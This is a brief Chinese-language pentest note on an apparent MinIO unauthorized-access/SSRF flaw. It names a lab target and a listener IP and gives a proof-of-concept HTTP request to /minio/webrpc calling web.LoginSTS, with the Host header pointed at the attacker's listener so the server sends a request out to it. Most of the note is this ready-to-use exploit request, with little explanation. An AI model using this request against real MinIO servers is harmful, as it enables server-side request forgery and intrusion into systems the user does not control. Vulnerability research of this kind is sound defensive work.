### Minio未授权

靶机：10.10.10.139

监听：10.10.10.129



向服务器发送请求，修改请求头中HOST的值，让其返回数据包给攻击者的监听服务器



POC:

```
POST /minio/webrpc HTTP/1.1
Host: 10.10.10.129:6666
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Content-Type: application/json
Connection: close
Content-Length: 60

{"id":1,"jsonrpc":"2.0","params":{},"method":"web.LoginSTS"}
```

![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220721091909.png)





监听得到返回包，证明漏洞存在

![image-20220721091928433](C:\Users\19026\AppData\Roaming\Typora\typora-user-images\image-20220721091928433.png)